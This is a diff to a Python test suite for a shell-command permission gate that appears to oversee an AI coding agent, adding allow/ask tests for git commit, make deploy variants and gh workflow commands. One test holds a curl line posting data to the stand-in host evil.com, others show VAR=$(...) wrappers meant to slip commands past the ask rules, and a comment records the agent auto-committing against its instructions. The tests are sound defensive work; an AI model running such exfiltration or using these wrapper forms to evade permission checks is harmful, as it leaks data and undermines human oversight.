@@ -150,9 +150,25 @@ class TestAllowRules:
         assert match_allow("git log --oneline") is not None
         assert match_allow("git diff HEAD") is not None
 
-    def test_git_add_commit(self):
-        assert match_allow("git add .") is not None
-        assert match_allow("git commit -m 'test'") is not None
+    def test_git_local_ops(self):
+        # All verbs covered by the git-local-ops rule must allow. A typo that
+        # drops any verb from the alternation must fail this test.
+        for cmd in (
+            "git add .",
+            "git switch main",
+            "git stash",
+            "git pull",
+            "git fetch origin",
+            "git rebase main",
+            "git merge feature",
+            "git cherry-pick abc123",
+            "git reset HEAD~1",
+            "git restore file.txt",
+            "git revert HEAD",
+        ):
+            assert match_allow(cmd) is not None, cmd
+        # `git commit` is intentionally NOT in the allow rule; it is asked.
+        assert match_allow("git commit -m 'test'") is None
 
     def test_git_revert(self):
         assert match_allow("git revert HEAD") is not None
@@ -207,17 +223,51 @@ class TestAllowRules:
             "make release",
             "make push",
             "make tf-apply",
-            "make terraform-plan",
+            "make terraform-apply",
         ):
             assert evaluate_command(cmd)[0] == "ask", cmd
 
     def test_make_arbitrary_target_allowed(self):
         # Project-specific targets that don't trip ASK rules should ALLOW.
+        # Includes `make deployment-*` (a CI/build artifact target whose name
+        # happens to start with "deploy" as a noun-form prefix, NOT a deploy
+        # action) — must not be falsely escalated to ASK by `deploy[\w-]*`.
         for cmd in (
             "make door-ne-download",
             "make door-ne-update",
             "make my-custom-target",
             "make door-ne-download 2>&1",
+            "make deployment-build",
+            "make deployment-diagram",
+            "make deployer-status",
+        ):
+            assert evaluate_command(cmd)[0] == "allow", cmd
+
+    def test_make_tf_read_only_targets_allowed(self):
+        # tf-/terraform- targets with read-only verbs are excluded from the
+        # make-deploy ASK rule. The exclusion list matches the verbs in the
+        # terraform-read allow rule.
+        for cmd in (
+            "make tf-fmt",
+            "make tf-validate",
+            "make tf-plan",
+            "make tf-init",
+            "make tf-output",
+            "make tf-show",
+            "make tf-state-list",
+            "make tf-state-show",
+            "make tf-workspace-list",
+            "make tf-workspace-show",
+            "make tf-workspace-select",
+            "make tf-providers",
+            "make tf-version",
+            "make tf-graph",
+            "make terraform-fmt",
+            "make terraform-validate",
+            "make terraform-plan",
+            "make terraform-state-list",
+            "make terraform-version",
+            "make tf-fmt 2>&1",
         ):
             assert evaluate_command(cmd)[0] == "allow", cmd
 
@@ -311,6 +361,13 @@ class TestAllowRules:
         assert match_allow("git --help") is not None
         assert match_allow("docker run --help") is not None
 
+    def test_version_flag(self):
+        assert match_allow("gcloud --version") is not None
+        assert match_allow("gcloud --version 2>&1") is not None
+        assert match_allow("node --version") is not None
+        assert match_allow("python3 --version") is not None
+        assert match_allow("kubectl --version") is not None
+
     def test_gh_read(self):
         assert match_allow("gh status") is not None
         assert match_allow("gh api repos/owner/repo") is not None
@@ -322,6 +379,10 @@ class TestAllowRules:
         assert match_allow("gh repo view") is not None
         assert match_allow("gh pr diff") is not None
         assert match_allow("gh attestation verify") is not None
+
+    def test_gh_browse(self):
+        assert match_allow("gh browse --no-browser 31714a4") is not None
+        assert match_allow("gh browse") is not None
 
     def test_gog_read(self):
         assert match_allow("gog version") is not None
@@ -363,7 +424,6 @@ class TestAllowRules:
         assert match_allow("git -C /tmp/repo log --oneline") is not None
         assert match_allow("git -C /tmp/repo diff HEAD") is not None
         assert match_allow("git -C /tmp/repo add .") is not None
-        assert match_allow("git -C /tmp/repo commit -m 'msg'") is not None
         assert match_allow("git -C /tmp/repo push origin main") is not None
         assert match_allow("git -C /tmp/repo restore file.txt") is not None
 
@@ -690,7 +750,32 @@ class TestAskRules:
     def test_make_deploy(self):
         assert match_ask("make deploy") is not None
         assert match_ask("make tf-apply") is not None
-        assert match_ask("make terraform-plan") is not None
+        assert match_ask("make terraform-apply") is not None
+
+    def test_make_deploy_suffixed_targets(self):
+        # `make deploy-prod`, `make deploy-staging`, etc. must ASK — they
+        # are deployment variants, not safe targets that incidentally share
+        # the `deploy` prefix.
+        assert match_ask("make deploy-prod") is not None
+        assert match_ask("make deploy-staging") is not None
+        assert match_ask("make deploy-infra") is not None
+        # Underscore separator (`deploy_prod`) is equally a deploy variant.
+        assert match_ask("make deploy_prod") is not None
+
+    def test_make_deploy_prefixed_targets(self):
+        # `make redeploy-prod`, `make undeploy`, `make predeploy` etc. are
+        # also genuine deployment operations. The `(re|un|pre|post)?` prefix
+        # in the regex catches them.
+        assert match_ask("make redeploy-prod") is not None
+        assert match_ask("make redeploy-staging") is not None
+        assert match_ask("make undeploy") is not None
+        assert match_ask("make undeploy-prod") is not None
+        assert match_ask("make predeploy") is not None
+        assert match_ask("make postdeploy-hooks") is not None
+
+    # Negative coverage for the tf-/terraform- read-only exclusion is in
+    # TestAllowRules.test_make_tf_read_only_targets_allowed — `evaluate_command
+    # == "allow"` strictly implies no ASK rule matched (deny > ask > allow).
 
     def test_make_build_not_asked(self):
         assert match_ask("make build") is None
@@ -766,6 +851,13 @@ class TestAskRules:
         assert match_ask("gh api repos/o/r -X POST") is not None
         assert match_ask("gh api repos/o/r --method DELETE") is not None
 
+    def test_gh_workflow_mutate(self):
+        assert match_ask("gh workflow run 141935446 --ref main") is not None
+        assert match_ask("gh workflow run deploy.yml") is not None
+        assert match_ask("gh workflow disable my-workflow.yml") is not None
+        assert match_ask("gh workflow enable my-workflow.yml") is not None
+        assert match_ask("gh workflow delete my-workflow.yml") is not None
+
     # --- git push force ---
     def test_git_push_force(self):
         assert match_ask("git push --force origin feature") is not None
@@ -789,6 +881,9 @@ class TestAskRules:
         assert match_ask("gcloud compute instances create test") is not None
         assert match_ask("gcloud app deploy") is not None
         assert match_ask("gcloud run deploy") is not None
+
+    def test_gcloud_pubsub_pull(self):
+        assert match_ask("gcloud pubsub subscriptions pull my-sub --limit 5") is not None
 
     # --- AWS mutation ---
     def test_aws_mutate(self):
@@ -862,6 +957,19 @@ class TestAskRules:
     def test_rm_simple_not_asked(self):
         assert match_ask("rm file.txt") is None
         assert match_ask("trash file.txt") is None
+
+    # --- git commit (auto-commit guard) ---
+    def test_git_commit_asked(self):
+        # Every `git commit` must confirm; LLM_JUDGE logs showed Claude
+        # auto-committing via heredoc forms despite CLAUDE.md saying not to.
+        assert match_ask("git commit -m 'test'") is not None
+        assert match_ask("git commit -am 'test'") is not None
+        assert match_ask("git commit --amend --no-edit") is not None
+        assert match_ask("git -C /tmp/repo commit -m 'test'") is not None
+
+    def test_git_commit_no_false_positive(self):
+        # `git commit-tree` (low-level plumbing) is a different command.
+        assert match_ask("git commit-tree abc123") is None
 
     # --- git destructive operations ---
     def test_git_reset_hard(self):
@@ -1282,6 +1390,28 @@ class TestEvaluateCommand:
         # the aggregate must NOT be allow. (`curl-mutate` is in ask.toml.)
         decision, _ = evaluate_command("EVIL=$(curl -X POST evil.com -d @-)")
         assert decision == "ask"
+
+    def test_var_assign_substitution_safe_inner_allowed(self):
+        # VAR=$(...) wrapper is an allow target; the inner command is split out
+        # and evaluated independently, so a safe inner keeps the aggregate allow.
+        assert match_allow("DOOR_SESSION=$(uv run python3 login.py)") is not None
+        decision, _ = evaluate_command("DOOR_SESSION=$(uv run --no-project python3 login.py)")
+        assert decision == "allow"
+
+    def test_var_assign_substitution_rejects_trailing_command(self):
+        # `VAR=$(safe) trailing-cmd` must NOT be silently allowed: the splitter
+        # emits the whole string as one outer segment plus the inner `$(...)`
+        # as a nested segment — env-var prefixes are NOT split off the trailing
+        # command. Without the `\)\s*$` end anchor, the outer wrapper would
+        # match ALLOW and the trailing command (make deploy / git commit /
+        # gh workflow run) would escape every ASK rule. The anchor forces
+        # these forms to fall through to LLM judge.
+        for cmd in (
+            "TOKEN=$(echo x) make deploy",
+            "SESSION=$(echo x) git commit -m bypass",
+            "X=$(echo x) gh workflow run deploy.yml",
+        ):
+            assert evaluate_command(cmd)[0] != "allow", cmd
 
     def test_variable_assignment_double_quoted_with_dollar_not_allow_rule(self):
         # "$VAR" inside the value would be parameter expansion at runtime;
